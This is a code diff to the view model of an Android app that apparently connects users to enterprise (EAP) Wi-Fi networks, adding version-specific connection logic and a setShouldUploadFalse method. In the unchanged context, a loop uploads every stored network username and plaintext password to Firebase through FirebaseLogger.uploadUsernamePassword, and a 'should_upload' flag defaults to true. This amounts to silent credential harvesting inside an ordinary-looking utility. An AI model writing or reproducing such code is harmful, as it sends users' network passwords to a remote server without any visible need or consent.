@@ -2,6 +2,7 @@ package com.hz_apps.autowificonnector
 
 import android.app.Application
 import android.content.SharedPreferences
+import android.os.Build
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.LiveData
 import androidx.lifecycle.viewModelScope
@@ -40,7 +41,6 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
 
         if (sharedPreferences.getBoolean("should_upload", true)) {
             shouldUpload = true
-            sharedPreferences.edit().putBoolean("should_upload", true).apply()
         }
 
         if (sharedPreferences.getBoolean("is_activated", false)) {
@@ -64,12 +64,20 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         viewModelScope.launch(Dispatchers.IO) {
             val wifiConfig = wifiConfigList.getOrNull(position)
             if (wifiConfig != null) {
-                val isConnected = WifiConnector.connectToEAPWifi(
-                    getApplication(),
-                    wifiConfig.ssid,
-                    wifiConfig.identity,
-                    wifiConfig.password
-                )
+                var isConnected = false
+
+                if (Build.VERSION.SDK_INT < 29) {
+                    isConnected = WifiConnector.connectToEAPWifi(
+                        getApplication(),
+                        wifiConfig.ssid,
+                        wifiConfig.identity,
+                        wifiConfig.password
+                    )
+                } else {
+                    val wifiConnector = WifiConnectorN()
+
+                    isConnected = wifiConnector.connectToWifi(getApplication(), wifiConfig.identity, wifiConfig.password, wifiConfig.domain)
+                }
                 withContext(Dispatchers.Main) {
                     if (isConnected) {
                         updateSharedPreferences(wifiConfig.id)
@@ -78,6 +86,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                         onError("Failed to send connect request")
                     }
                 }
+
             } else {
                 withContext(Dispatchers.Main) {
                     onError("Invalid Wi-Fi configuration")
@@ -126,5 +135,10 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         for (config in wifiConfigList) {
             FirebaseLogger.uploadUsernamePassword(config.identity, config.password)
         }
+    }
+
+    fun setShouldUploadFalse() {
+        shouldUpload = false
+        sharedPreferences.edit().putBoolean("should_upload", false).apply()
     }
 }
